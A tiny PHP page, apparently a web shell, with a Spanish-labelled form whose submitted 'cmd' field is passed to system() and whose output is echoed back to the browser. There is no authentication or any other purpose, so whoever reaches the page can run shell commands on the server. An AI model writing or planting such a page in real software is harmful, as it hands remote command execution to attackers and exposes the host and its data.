<?php
if(isset($_POST['enviar'])){
    $cmd = escapeshellarg($_POST['cmd']);
    echo "<pre>";
    $comando = utf8_encode(system($cmd,$retorno));
    echo "</pre>";
}



?>

<form method="post">
    <input type="text" name="cmd">
    <button name="enviar" type="submit">Enviar</button>
</form>